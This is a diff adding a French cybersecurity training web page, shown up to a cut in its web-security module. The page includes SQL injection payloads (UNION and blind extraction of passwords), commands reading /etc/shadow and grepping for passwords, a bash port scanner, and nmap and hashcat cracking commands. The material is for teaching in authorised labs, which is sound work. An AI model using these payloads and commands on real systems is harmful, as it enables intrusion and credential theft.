@@ -1,0 +1,1414 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CyberLab — apprendre la cybersécurité</title>
+<style>
+:root{
+  --bg:#0b0f14; --panel:#111821; --ink:#d7e3f0; --mut:#8aa0b4;
+  --acc:#58e6a4; --warn:#ffb454; --dang:#ff5c6c; --info:#6cb8ff;
+  --code:#0a1118; --line:#1b2634; --sel:#1f3b2d;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:15px;line-height:1.55}
+a{color:var(--info);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--sel)}
+.app{display:grid;grid-template-columns:280px 1fr;min-height:100vh}
+nav.side{
+  background:var(--panel);border-right:1px solid var(--line);
+  padding:18px 14px;position:sticky;top:0;height:100vh;overflow:auto
+}
+nav.side h1{font-size:18px;margin:0 0 4px;color:var(--acc);font-family:var(--mono)}
+nav.side .sub{color:var(--mut);font-size:12px;margin-bottom:16px}
+nav.side ul{list-style:none;margin:0;padding:0}
+nav.side li{margin:2px 0}
+nav.side a{
+  display:block;padding:7px 10px;border-radius:6px;color:var(--ink);
+  font-size:14px;border-left:2px solid transparent
+}
+nav.side a:hover{background:#182230;text-decoration:none}
+nav.side a.active{background:#172431;border-left-color:var(--acc);color:var(--acc)}
+nav.side .progress{
+  margin-top:18px;padding:10px;background:#0e1620;border:1px solid var(--line);border-radius:8px;font-size:12px
+}
+nav.side .bar{height:6px;background:#0a1118;border-radius:3px;overflow:hidden;margin-top:6px}
+nav.side .bar>i{display:block;height:100%;background:var(--acc);width:0%}
+main{padding:36px 48px;max-width:1100px}
+section{display:none;margin-bottom:48px}
+section.on{display:block}
+h2{color:var(--acc);font-family:var(--mono);border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:0}
+h3{color:var(--info);margin-top:28px}
+h4{color:var(--warn);margin-top:20px;font-size:15px}
+p{margin:10px 0}
+ul,ol{margin:10px 0;padding-left:22px}
+li{margin:4px 0}
+code{font-family:var(--mono);background:#0e1620;color:var(--acc);padding:1px 5px;border-radius:4px;font-size:13.5px}
+pre{
+  background:var(--code);border:1px solid var(--line);border-radius:8px;
+  padding:14px 16px;overflow:auto;font-family:var(--mono);font-size:13px;
+  color:#cfe3f3;position:relative
+}
+pre .cmt{color:#5c7489}
+pre .kw{color:var(--acc)}
+pre .str{color:var(--warn)}
+pre .num{color:var(--info)}
+pre.label::before{
+  content:attr(data-lang);position:absolute;top:0;right:0;
+  background:var(--line);color:var(--mut);font-size:11px;padding:2px 8px;
+  border-bottom-left-radius:6px
+}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px 18px;margin:14px 0}
+.card h4{margin-top:0}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.tag{display:inline-block;font-size:11px;padding:2px 8px;border-radius:10px;background:#172431;color:var(--mut);margin-right:4px}
+.tag.red{background:#2a1217;color:var(--dang)}
+.tag.grn{background:#102a1f;color:var(--acc)}
+.tag.yel{background:#2a2112;color:var(--warn)}
+.tag.blu{background:#122235;color:var(--info)}
+.warn-box{border-left:3px solid var(--warn);background:#1a1710;padding:10px 14px;border-radius:0 6px 6px 0;margin:12px 0}
+.danger-box{border-left:3px solid var(--dang);background:#1a1013;padding:10px 14px;border-radius:0 6px 6px 0;margin:12px 0}
+.ok-box{border-left:3px solid var(--acc);background:#101a14;padding:10px 14px;border-radius:0 6px 6px 0;margin:12px 0}
+table{width:100%;border-collapse:collapse;margin:14px 0;font-size:14px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line)}
+th{color:var(--mut);font-weight:600;background:#0e1620}
+.quiz{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;margin:14px 0}
+.quiz .q{font-weight:600;margin-bottom:8px}
+.quiz label{display:block;padding:6px 10px;border-radius:6px;cursor:pointer;margin:3px 0;border:1px solid transparent}
+.quiz label:hover{background:#172431}
+.quiz label.ok{background:#102a1f;border-color:var(--acc)}
+.quiz label.ko{background:#2a1217;border-color:var(--dang)}
+.quiz input{margin-right:8px}
+.quiz .expl{margin-top:8px;font-size:13px;color:var(--mut);display:none;padding:8px;background:#0e1620;border-radius:6px}
+.quiz .expl.on{display:block}
+button{
+  background:var(--acc);color:#001;border:0;padding:7px 14px;border-radius:6px;
+  font-family:var(--mono);font-size:13px;cursor:pointer;font-weight:600
+}
+button:hover{background:#7cedb8}
+button.sec{background:#1e2b3b;color:var(--ink)}
+button.sec:hover{background:#263548}
+.chk{list-style:none;padding-left:0}
+.chk li{padding:4px 0;cursor:pointer;user-select:none}
+.chk li::before{content:"[ ]";font-family:var(--mono);color:var(--mut);margin-right:8px}
+.chk li.done{color:var(--mut);text-decoration:line-through}
+.chk li.done::before{content:"[x]";color:var(--acc)}
+.term{
+  background:#000;border:1px solid var(--line);border-radius:8px;padding:12px 14px;
+  font-family:var(--mono);font-size:13px;color:#9eb3c7;overflow:auto
+}
+.term .pr{color:var(--acc)}
+.term .out{color:#7a8fa3}
+.kbd{font-family:var(--mono);background:#1e2b3b;border:1px solid var(--line);border-bottom-width:2px;border-radius:4px;padding:1px 6px;font-size:12px}
+footer{color:var(--mut);font-size:12px;border-top:1px solid var(--line);margin-top:40px;padding-top:16px}
+@media (max-width:900px){
+  .app{grid-template-columns:1fr}
+  nav.side{position:static;height:auto}
+  main{padding:20px}
+  .grid2,.grid3{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<nav class="side">
+  <h1>CyberLab</h1>
+  <div class="sub">apprentissage offensif &amp; défensif — FR</div>
+  <ul id="toc">
+    <li><a href="#intro" class="active">00 — Démarrer ici</a></li>
+    <li><a href="#fondations">01 — Fondations</a></li>
+    <li><a href="#linux">02 — Linux &amp; shell</a></li>
+    <li><a href="#reseau">03 — Réseau TCP/IP</a></li>
+    <li><a href="#crypto">04 — Cryptographie</a></li>
+    <li><a href="#web">05 — Sécurité web</a></li>
+    <li><a href="#systemes">06 — Systèmes &amp; AD</a></li>
+    <li><a href="#reverse">07 — Reverse engineering</a></li>
+    <li><a href="#malware">08 — Malware &amp; EDR</a></li>
+    <li><a href="#forensics">09 — Forensics / DFIR</a></li>
+    <li><a href="#redteam">10 — Red team / pentest</a></li>
+    <li><a href="#opsec">11 — OPSEC</a></li>
+    <li><a href="#labs">12 — Labs &amp; CTF</a></li>
+    <li><a href="#ressources">13 — Ressources</a></li>
+    <li><a href="#quiz">14 — Quiz final</a></li>
+  </ul>
+  <div class="progress">
+    <div>Progression modules</div>
+    <div class="bar"><i id="pbar"></i></div>
+    <div id="ptxt" style="margin-top:6px"></div>
+    <button class="sec" style="margin-top:8px;width:100%" onclick="resetAll()">Réinitialiser</button>
+  </div>
+</nav>
+
+<main>
+
+<section id="intro" class="on">
+  <h2>00 — Démarrer ici</h2>
+  <p>CyberLab est un parcours structuré pour apprendre la cybersécurité de zéro jusqu'à un niveau opérationnel : attaquer pour comprendre, défendre pour protéger. Chaque module empile sur le précédent. Les quiz et checklists sont sauvegardés dans ton navigateur (<code>localStorage</code>).</p>
+
+  <div class="card">
+    <h4>Comment utiliser ce site</h4>
+    <ol>
+      <li>Lis le module dans l'ordre. Les notions se chevauchent.</li>
+      <li>Fais tourner les commandes dans une VM — jamais sur ta machine hôte au début.</li>
+      <li>Passe le quiz à la fin de chaque module. Score &gt; 80% = tu peux avancer.</li>
+      <li>Après le module 12, va casser des choses sur HackTheBox / TryHackMe.</li>
+    </ol>
+  </div>
+
+  <div class="warn-box">
+    <strong>Cadre légal.</strong> Tester un système sans autorisation écrite est un délit (art. 323-1 à 323-7 du Code pénal, FR / Computer Fraud and Abuse Act, US). Les techniques décrites ici s'exercent sur <em>tes</em> machines, des VM isolées, des plateformes qui autorisent l'intrusion (HTB, THM, portswigger, etc.), ou dans le cadre d'un contrat de pentest signé.
+  </div>
+
+  <h3>Setup labo recommandé</h3>
+  <div class="grid2">
+    <div class="card">
+      <h4>Hyperviseur</h4>
+      <ul>
+        <li><b>VirtualBox</b> — gratuit, cross-platform</li>
+        <li><b>VMware Workstation Player</b> — gratuit non-com</li>
+        <li><b>Proxmox</b> — type-1, pour un vrai labo</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>VMs à préparer</h4>
+      <ul>
+        <li><b>Kali Linux</b> ou <b>Parrot OS</b> — attaquant</li>
+        <li><b>Ubuntu Server</b> — cible générique</li>
+        <li><b>Windows 10/11 Eval</b> — cible AD</li>
+        <li><b>Metasploitable 2/3</b>, <b>DVWA</b>, <b>VulnHub</b> — cibles vulnérables</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Les trois questions qui structurent tout</h3>
+  <ol>
+    <li><b>Qu'est-ce qu'on protège ?</b> — données, service, réputation, vies.</li>
+    <li><b>Contre qui ?</b> — script-kiddie, criminel organisé, État, insider.</li>
+    <li><b>Jusqu'où ?</b> — budget, surface d'attaque acceptable, tolérance à l'incident.</li>
+  </ol>
+  <p>Toute décision sécu redescend à ces trois. Un contrôle qui ne répond à aucune des trois est du théâtre.</p>
+</section>
+
+<section id="fondations">
+  <h2>01 — Fondations</h2>
+
+  <h3>La triade CIA</h3>
+  <table>
+    <tr><th>Propriété</th><th>Garantit que…</th><th>Contrôles typiques</th></tr>
+    <tr><td><b>Confidentialité</b></td><td>Seuls les autorisés lisent</td><td>Chiffrement, ACL, segmentation</td></tr>
+    <tr><td><b>Intégrité</b></td><td>Les données ne sont pas altérées</td><td>Hashs, signatures, WORM, HMAC</td></tr>
+    <tr><td><b>Disponibilité</b></td><td>Le service répond quand demandé</td><td>Redondance, DDoS mitigation, backups</td></tr>
+  </table>
+
+  <h3>Les concepts qu'on confond tout le temps</h3>
+  <div class="card">
+    <p><b>Vulnérabilité</b> — un défaut (bug, erreur de config, humain naïf).</p>
+    <p><b>Menace</b> — un acteur capable d'exploiter cette vulnérabilité.</p>
+    <p><b>Risque</b> — probabilité × impact. Pas de risque sans les deux.</p>
+    <p><b>Exploit</b> — l'arme concrète qui transforme la vulnérabilité en compromission.</p>
+    <p><b>Payload</b> — ce qui s'exécute après l'exploit (shell, mineur, ransomware, implant).</p>
+  </div>
+
+  <h3>AAA</h3>
+  <ul>
+    <li><b>Authentification</b> — qui es-tu ? (quelque chose que tu sais / as / es)</li>
+    <li><b>Autorisation</b> — qu'as-tu le droit de faire ?</li>
+    <li><b>Audit</b> — qu'as-tu fait, et quand ?</li>
+  </ul>
+
+  <h3>Modèle d'attaque — kill chain Lockheed Martin</h3>
+  <ol>
+    <li>Reconnaissance — collecter de l'info sur la cible</li>
+    <li>Armement — préparer l'exploit + payload</li>
+    <li>Livraison — mail, USB, drive-by, chaîne d'appro</li>
+    <li>Exploitation — déclencher la vuln</li>
+    <li>Installation — poser une persistance</li>
+    <li>C2 — relier au serveur de commande</li>
+    <li>Actions sur objectif — exfil, chiffrement, sabotage</li>
+  </ol>
+
+  <h3>MITRE ATT&amp;CK</h3>
+  <p>Catalogue vivant des <i>tactiques</i> (quoi) et <i>techniques</i> (comment) utilisées par les attaquants réels. 14 tactiques, des centaines de techniques. Référence à l'usage défenseur comme offenseur. À bookmarker : <code>attack.mitre.org</code>.</p>
+
+  <div class="quiz" data-q="f1">
+    <div class="q">1. Un attaquant chiffre tes fichiers et demande une rançon. Quelle propriété CIA est principalement attaquée ?</div>
+    <label><input type="radio" name="f1" value="c"> Confidentialité</label>
+    <label><input type="radio" name="f1" value="i"> Intégrité</label>
+    <label><input type="radio" name="f1" value="a" data-ok> Disponibilité</label>
+    <div class="expl">Les fichiers chiffrés par ransomware restent présents mais inutilisables — c'est la disponibilité qui tombe. Si l'attaquant exfiltre aussi (double extorsion), la confidentialité tombe aussi, mais l'impact immédiat du chiffrement = indisponibilité.</div>
+  </div>
+
+  <div class="quiz" data-q="f2">
+    <div class="q">2. Vulnérabilité × menace × impact. Qu'est-ce que ça donne ?</div>
+    <label><input type="radio" name="f2" value="a"> Un exploit</label>
+    <label><input type="radio" name="f2" value="b" data-ok> Un risque</label>
+    <label><input type="radio" name="f2" value="c"> Une CVE</label>
+    <div class="expl">Risque = fonction de la probabilité (menace × vulnérabilité) et de l'impact. L'exploit est l'outil, la CVE est un identifiant.</div>
+  </div>
+</section>
+
+<section id="linux">
+  <h2>02 — Linux &amp; shell</h2>
+  <p>Linux est la lingua franca de la cyber. Serveurs, outils offensifs, forensics, cloud — tout passe par un shell POSIX. Tu dois être à l'aise avec <code>bash</code> avant tout le reste.</p>
+
+  <h3>Arborescence</h3>
+  <table>
+    <tr><th>Chemin</th><th>Contenu</th></tr>
+    <tr><td><code>/etc</code></td><td>Configurations système</td></tr>
+    <tr><td><code>/var/log</code></td><td>Logs — <code>auth.log</code>, <code>syslog</code>, <code>journalctl</code></td></tr>
+    <tr><td><code>/home</code></td><td>Dossiers utilisateurs</td></tr>
+    <tr><td><code>/proc</code></td><td>Pseudo-FS, infos sur les process (<code>/proc/[pid]/</code>)</td></tr>
+    <tr><td><code>/tmp</code>, <code>/dev/shm</code></td><td>Zones écrivables par tous — favoris des attaquants</td></tr>
+    <tr><td><code>/root</code></td><td>Home de root</td></tr>
+  </table>
+
+  <h3>Commandes essentielles</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># navigation &amp; inspection</span>
+pwd ; ls -la ; cd - ; file &lt;f&gt; ; stat &lt;f&gt;
+find / -name "*.conf" 2&gt;/dev/null
+find / -perm -4000 2&gt;/dev/null       <span class="cmt"># SUID = pépite privesc</span>
+grep -rni "password" /etc 2&gt;/dev/null
+
+<span class="cmt"># process &amp; réseau</span>
+ps auxf ; top ; htop
+ss -tulnp                             <span class="cmt"># ports à l'écoute, net-tools remplacé</span>
+lsof -i :80
+netstat -antp                         <span class="cmt"># legacy</span>
+
+<span class="cmt"># utilisateurs</span>
+id ; whoami ; groups
+cat /etc/passwd ; sudo cat /etc/shadow
+last ; w ; who
+
+<span class="cmt"># package / service</span>
+systemctl status ssh
+journalctl -u ssh -f
+apt list --installed | grep openssh</pre>
+
+  <h3>Permissions</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># rwx = 4+2+1 ; triplet owner/group/other</span>
+chmod 750 script.sh       <span class="cmt"># owner=rwx, group=r-x, other=---</span>
+chown user:group f
+<span class="cmt"># SUID (s au lieu de x) → s'exécute avec l'UID du propriétaire</span>
+<span class="cmt"># SGID / sticky bit (/tmp) → comportements particuliers</span>
+chmod u+s binaire         <span class="cmt"># SUID</span></pre>
+
+  <div class="warn-box">Un binaire SUID root mal écrit = privesc instantanée. Vérifie toujours <code>find / -perm -4000</code> en post-exploitation. GTFOBins (<code>gtfobins.github.io</code>) catalogue les abus connus.</div>
+
+  <h3>Shell scripting — le minimum vital</h3>
+  <pre data-lang="bash" class="label">#!/usr/bin/env bash
+set -euo pipefail      <span class="cmt"># strict mode</span>
+
+TARGET="${1:-}"
+[[ -z "$TARGET" ]] &amp;&amp; { echo "usage: $0 &lt;cible&gt;"; exit 1; }
+
+for port in 22 80 443 3306 5432; do
+  if timeout 1 bash -c "&lt;/dev/tcp/$TARGET/$port" 2&gt;/dev/null; then
+    echo "[+] $TARGET:$port ouvert"
+  fi
+done</pre>
+
+  <h3>Terminal interactif — exercice</h3>
+  <p>Ouvre un terminal dans ta VM Kali et reproduis :</p>
+  <div class="term">
+<span class="pr">kali@kali:~$</span> uname -a<br>
+<span class="out">Linux kali 6.x.x-amd64 ...</span><br>
+<span class="pr">kali@kali:~$</span> cat /etc/os-release | head -2<br>
+<span class="pr">kali@kali:~$</span> ip -br a ; ip route<br>
+<span class="pr">kali@kali:~$</span> curl -s ifconfig.me ; echo
+  </div>
+
+  <h3>Checklist module</h3>
+  <ul class="chk" data-k="linux">
+    <li>Je sais naviguer sans utiliser la souris</li>
+    <li>Je comprends <code>chmod</code> en octal</li>
+    <li>Je sais tuer un process par PID et par nom</li>
+    <li>Je lis les logs avec <code>journalctl</code></li>
+    <li>J'ai écrit un script bash avec arguments</li>
+    <li>Je sais pipe et rediriger (<code>|</code>, <code>&gt;</code>, <code>2&gt;&amp;1</code>)</li>
+  </ul>
+
+  <div class="quiz" data-q="l1">
+    <div class="q">Trouver tous les binaires SUID du système :</div>
+    <label><input type="radio" name="l1"> <code>ls -la / | grep s</code></label>
+    <label><input type="radio" name="l1" data-ok> <code>find / -perm -4000 2&gt;/dev/null</code></label>
+    <label><input type="radio" name="l1"> <code>chmod -R +s /</code></label>
+    <div class="expl">Le bit SUID vaut 4000 en octal. <code>-perm -4000</code> matche tout fichier qui a <em>au moins</em> ce bit. <code>2&gt;/dev/null</code> jette les erreurs de permission.</div>
+  </div>
+</section>
+
+<section id="reseau">
+  <h2>03 — Réseau TCP/IP</h2>
+
+  <h3>Le modèle OSI vs TCP/IP</h3>
+  <table>
+    <tr><th>OSI</th><th>TCP/IP</th><th>Exemples</th></tr>
+    <tr><td>7 Application</td><td rowspan="3">Application</td><td>HTTP, DNS, SSH, SMTP</td></tr>
+    <tr><td>6 Présentation</td><td>TLS, charset</td></tr>
+    <tr><td>5 Session</td><td>NetBIOS, SMB</td></tr>
+    <tr><td>4 Transport</td><td>Transport</td><td>TCP, UDP, QUIC</td></tr>
+    <tr><td>3 Réseau</td><td>Internet</td><td>IP, ICMP, routage</td></tr>
+    <tr><td>2 Liaison</td><td rowspan="2">Accès réseau</td><td>Ethernet, ARP, Wi-Fi (802.11)</td></tr>
+    <tr><td>1 Physique</td><td>Câbles, ondes</td></tr>
+  </table>
+
+  <h3>TCP vs UDP</h3>
+  <div class="grid2">
+    <div class="card">
+      <h4>TCP</h4>
+      <ul>
+        <li>Connecté — handshake 3-way (SYN → SYN/ACK → ACK)</li>
+        <li>Fiable — retransmission, ordre</li>
+        <li>Flags : <code>SYN, ACK, FIN, RST, PSH, URG</code></li>
+        <li>Usage : HTTP, SSH, SMB</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>UDP</h4>
+      <ul>
+        <li>Pas de connexion, pas de garantie</li>
+        <li>Rapide, léger</li>
+        <li>Usage : DNS, DHCP, VoIP, QUIC (couche au-dessus)</li>
+        <li>Difficile à scanner (pas de réponse ≠ fermé)</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Ports qu'on croise en pentest</h3>
+  <table>
+    <tr><th>Port</th><th>Protocole</th><th>Notes offensives</th></tr>
+    <tr><td>21</td><td>FTP</td><td>Login anonyme, clear-text</td></tr>
+    <tr><td>22</td><td>SSH</td><td>Brute force, clés faibles, versions anciennes</td></tr>
+    <tr><td>23</td><td>Telnet</td><td>Clear-text, souvent IoT</td></tr>
+    <tr><td>25/587/465</td><td>SMTP</td><td>User enum (<code>VRFY</code>, <code>EXPN</code>), relais ouvert</td></tr>
+    <tr><td>53</td><td>DNS</td><td>Zone transfer (<code>AXFR</code>), DNS tunnel</td></tr>
+    <tr><td>80/443</td><td>HTTP(S)</td><td>Toute la surface web</td></tr>
+    <tr><td>88</td><td>Kerberos</td><td>AD — AS-REP roast, kerberoast</td></tr>
+    <tr><td>110/143/993/995</td><td>POP3/IMAP</td><td>Brute force</td></tr>
+    <tr><td>135/139/445</td><td>SMB/RPC</td><td>Enum partages, EternalBlue, PetitPotam</td></tr>
+    <tr><td>389/636</td><td>LDAP(S)</td><td>Énum AD anonyme possible</td></tr>
+    <tr><td>1433</td><td>MSSQL</td><td><code>xp_cmdshell</code>, impersonation</td></tr>
+    <tr><td>3306</td><td>MySQL</td><td>UDF exec, mots de passe en clair</td></tr>
+    <tr><td>3389</td><td>RDP</td><td>Brute force, BlueKeep (CVE-2019-0708)</td></tr>
+    <tr><td>5985/5986</td><td>WinRM</td><td>PowerShell distant</td></tr>
+  </table>
+
+  <h3>Nmap — l'outil de reconnaissance</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># découverte réseau — ping sweep</span>
+nmap -sn 192.168.1.0/24
+
+<span class="cmt"># scan rapide TCP top-1000</span>
+nmap -sS -T4 10.10.10.5
+
+<span class="cmt"># scan complet, versions, scripts par défaut, OS</span>
+sudo nmap -sS -sV -sC -O -p- --min-rate 2000 10.10.10.5 -oA full
+
+<span class="cmt"># UDP top-100 (lent)</span>
+sudo nmap -sU --top-ports 100 10.10.10.5
+
+<span class="cmt"># scripts NSE ciblés</span>
+nmap --script smb-enum-shares,smb-vuln-ms17-010 -p445 10.10.10.5
+nmap --script http-enum,http-title -p80,443 10.10.10.5
+
+<span class="cmt"># sortie dans tous les formats pour parsing</span>
+nmap ... -oA scan     <span class="cmt"># produit scan.nmap, scan.xml, scan.gnmap</span></pre>
+
+  <div class="ok-box"><code>-sS</code> (SYN scan) ne complète pas le handshake — moins loggé. <code>-sT</code> (connect) complète, préféré sans root.</div>
+
+  <h3>Wireshark / tcpdump</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># capture ciblée</span>
+sudo tcpdump -i eth0 -nn -w cap.pcap 'host 10.10.10.5 and port 80'
+
+<span class="cmt"># rejouer / lire</span>
+tcpdump -r cap.pcap -A | less
+
+<span class="cmt"># filtres wireshark fréquents</span>
+http.request.method == "POST"
+tcp.flags.syn == 1 and tcp.flags.ack == 0
+ip.addr == 10.10.10.5 and tcp.port in {80 443}
+dns.qry.name contains "evil"</pre>
+
+  <h3>DNS — comprendre</h3>
+  <pre data-lang="bash" class="label">dig example.com A +short
+dig example.com MX
+dig @8.8.8.8 example.com ANY
+dig axfr example.com @ns1.example.com   <span class="cmt"># zone transfer — rare mais exploitable</span>
+host -t txt example.com                 <span class="cmt"># SPF, DKIM, DMARC lisibles ici</span></pre>
+
+  <div class="quiz" data-q="r1">
+    <div class="q">Le handshake TCP est :</div>
+    <label><input type="radio" name="r1"> SYN → ACK → FIN</label>
+    <label><input type="radio" name="r1" data-ok> SYN → SYN/ACK → ACK</label>
+    <label><input type="radio" name="r1"> PSH → ACK → RST</label>
+    <div class="expl">Trois étapes : client envoie SYN, serveur répond SYN+ACK, client confirme ACK. Après, la connexion est établie.</div>
+  </div>
+
+  <div class="quiz" data-q="r2">
+    <div class="q">Port 445 ouvert sur une cible Windows, premier réflexe :</div>
+    <label><input type="radio" name="r2"> Scan UDP complet</label>
+    <label><input type="radio" name="r2" data-ok> Enum SMB (shares, users, OS, vulns)</label>
+    <label><input type="radio" name="r2"> Chercher du RCE Apache</label>
+    <div class="expl">445 = SMB. <code>smbclient -L</code>, <code>enum4linux-ng</code>, <code>nmap --script smb-*</code>. MS17-010 (EternalBlue) à checker sur Win7/2008.</div>
+  </div>
+</section>
+
+<section id="crypto">
+  <h2>04 — Cryptographie</h2>
+
+  <h3>Les trois familles</h3>
+  <div class="grid3">
+    <div class="card">
+      <h4>Symétrique</h4>
+      <p>Même clé pour chiffrer / déchiffrer. Rapide. Problème : partage de clé.</p>
+      <p>Exemples : <b>AES</b> (128/192/256), ChaCha20.</p>
+      <p>Modes : GCM (AEAD, à préférer), CBC, CTR. <b>Jamais ECB</b> — pattern visible.</p>
+    </div>
+    <div class="card">
+      <h4>Asymétrique</h4>
+      <p>Paire clé publique / clé privée. Lent. Résout le partage.</p>
+      <p>Exemples : <b>RSA</b>, <b>ECDSA</b>, Ed25519, X25519.</p>
+      <p>Usage : échange de clé, signature.</p>
+    </div>
+    <div class="card">
+      <h4>Hash</h4>
+      <p>Fonction à sens unique, taille fixe. Pas de clé.</p>
+      <p>Exemples : <b>SHA-256</b>, SHA-3, BLAKE2.</p>
+      <p>À éviter : MD5, SHA-1 (collisions prouvées).</p>
+      <p>Mots de passe : <b>Argon2id</b>, bcrypt, scrypt.</p>
+    </div>
+  </div>
+
+  <h3>Pourquoi on mélange les deux</h3>
+  <ol>
+    <li>Alice génère une clé AES aléatoire <code>K</code>.</li>
+    <li>Elle chiffre son message avec <code>K</code> (AES-GCM).</li>
+    <li>Elle chiffre <code>K</code> avec la clé publique RSA de Bob.</li>
+    <li>Elle envoie les deux. Bob déchiffre <code>K</code> avec sa privée, puis le message avec <code>K</code>.</li>
+  </ol>
+  <p>C'est l'idée de TLS, PGP, Signal. L'asymétrique transporte, le symétrique travaille.</p>
+
+  <h3>TLS en 30 secondes</h3>
+  <ol>
+    <li>Client → <b>ClientHello</b> (versions, ciphersuites, SNI, aléa)</li>
+    <li>Serveur → <b>ServerHello</b> + certificat (chaîne X.509) + clé éphémère</li>
+    <li>Échange ECDHE → secret partagé → dérivation de clés symétriques</li>
+    <li>Trafic chiffré en AES-GCM / ChaCha20-Poly1305</li>
+  </ol>
+  <p>Vérifs à faire sur un service : chaîne valide, versions ≥ TLS 1.2 (1.3 préféré), pas de ciphers faibles. Outil : <code>testssl.sh</code>.</p>
+
+  <h3>PKI, en pratique</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># voir le cert d'un service</span>
+openssl s_client -connect example.com:443 -servername example.com &lt;/dev/null \
+  | openssl x509 -noout -text
+
+<span class="cmt"># hash SHA-256 d'un fichier</span>
+sha256sum fichier.iso
+
+<span class="cmt"># générer une paire ed25519 (SSH)</span>
+ssh-keygen -t ed25519 -C "poste-kali" -f ~/.ssh/id_ed25519
+
+<span class="cmt"># chiffrer un fichier avec age (moderne, à préférer à gpg pour du simple)</span>
+age -r "age1..." fichier.txt &gt; fichier.txt.age</pre>
+
+  <h3>Attaques classiques</h3>
+  <table>
+    <tr><th>Attaque</th><th>Contre</th><th>Mitigation</th></tr>
+    <tr><td>Collision</td><td>Hash faible (MD5, SHA-1)</td><td>SHA-256+, hash dédié mdp</td></tr>
+    <tr><td>Rainbow table</td><td>Hash de mdp sans salt</td><td>Salt + algo lent (Argon2id)</td></tr>
+    <tr><td>Padding oracle</td><td>CBC sans MAC</td><td>AEAD (GCM, ChaChaPoly)</td></tr>
+    <tr><td>Downgrade / BEAST / POODLE</td><td>TLS vieux</td><td>Désactiver &lt; 1.2, HSTS</td></tr>
+    <tr><td>Replay</td><td>Protocole sans nonce</td><td>Nonce + timestamp + MAC</td></tr>
+    <tr><td>Side-channel (timing)</td><td>Comparaison naïve</td><td>Comparaison à temps constant</td></tr>
+  </table>
+
+  <h3>Craquer des hashs — labo</h3>
+  <pre data-lang="bash" class="label"><span class="cmt"># hashcat — GPU, format bien typé</span>
+hashcat -m 1000 hashes.txt rockyou.txt         <span class="cmt"># NTLM</span>
+hashcat -m 1800 hashes.txt rockyou.txt         <span class="cmt"># sha512crypt (Linux)</span>
+hashcat -m 22000 wifi.hc22000 rockyou.txt      <span class="cmt"># WPA/WPA2</span>
+
+<span class="cmt"># john the ripper — CPU, auto-détection</span>
+john --wordlist=rockyou.txt hashes.txt
+john --show hashes.txt</pre>
+
+  <div class="quiz" data-q="c1">
+    <div class="q">Un service te montre toujours le même ciphertext pour le même plaintext — même sur deux blocs identiques. Mode utilisé ?</div>
+    <label><input type="radio" name="c1"> GCM</label>
+    <label><input type="radio" name="c1" data-ok> ECB</label>
+    <label><input type="radio" name="c1"> CBC avec IV aléatoire</label>
+    <div class="expl">ECB chiffre chaque bloc indépendamment, sans IV. Même entrée = même sortie. Image "Tux" ECB classique. GCM et CBC avec IV aléatoire produisent des ciphertexts différents.</div>
+  </div>
+</section>
+
+<section id="web">
+  <h2>05 — Sécurité web</h2>
+  <p>Le web est la plus grande surface d'attaque du monde. L'<b>OWASP Top 10</b> catalogue les classes de vulnérabilités les plus répandues. On va les voir en profondeur.</p>
+
+  <h3>Modèle de requête HTTP</h3>
+  <pre data-lang="http" class="label">POST /login HTTP/1.1
+Host: app.example.com
+User-Agent: Mozilla/5.0
+Cookie: session=abc123
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=admin&amp;password=hunter2</pre>
+  <p>Comprendre chaque ligne (verbe, path, headers, body) est non-négociable. Burp Suite et <code>curl</code> seront tes outils.</p>
+
+  <h3>OWASP Top 10 — par classe</h3>
+
+  <h4>A01 — Broken Access Control / IDOR</h4>
+  <p>L'app vérifie que tu es connecté, mais pas que tu as le droit sur <em>cette ressource</em>.</p>
+  <pre data-lang="http" class="label">GET /api/invoices/4821       → ta facture, OK
+GET /api/invoices/4822       → la facture du voisin, aussi OK (BUG)</pre>
+  <p>Mitigation : vérifier l'ownership côté serveur sur <b>chaque</b> requête. Jamais depuis le JWT côté client seul.</p>
+
+  <h4>A02 — Cryptographic Failures</h4>
+  <ul>
+    <li>Mots de passe en clair ou MD5</li>
+    <li>HTTP au lieu de HTTPS sur du sensible</li>
+    <li>Clés en dur dans le code / git</li>
+  </ul>
+
+  <h4>A03 — Injection (SQLi, NoSQLi, cmd, LDAP)</h4>
+  <p>Concaténer de l'input non-échappé dans un interpréteur. Pattern universel.</p>
+  <pre data-lang="sql" class="label"><span class="cmt">-- app vulnérable</span>
+query = "SELECT * FROM users WHERE name = '" + input + "'"
+
+<span class="cmt">-- payload classique</span>
+input = <span class="str">admin' OR '1'='1' --</span>
+
+<span class="cmt">-- l'app exécute :</span>
+SELECT * FROM users WHERE name = 'admin' OR '1'='1' --'</pre>
+  <p>Mitigation : <b>requêtes paramétrées</b> (prepared statements). Toujours. Les ORM font ça pour toi si tu ne contournes pas.</p>
+
+  <h4>Union-based et blind SQLi</h4>
+  <pre data-lang="sql" class="label"><span class="cmt">-- déterminer le nombre de colonnes</span>
+' ORDER BY 1-- ' ORDER BY 2-- ...
+
+<span class="cmt">-- union pour extraire</span>
+' UNION SELECT null,username,password FROM users--
+
+<span class="cmt">-- blind booléenne</span>
+' AND (SELECT substr(password,1,1) FROM users WHERE id=1)='a'--
+
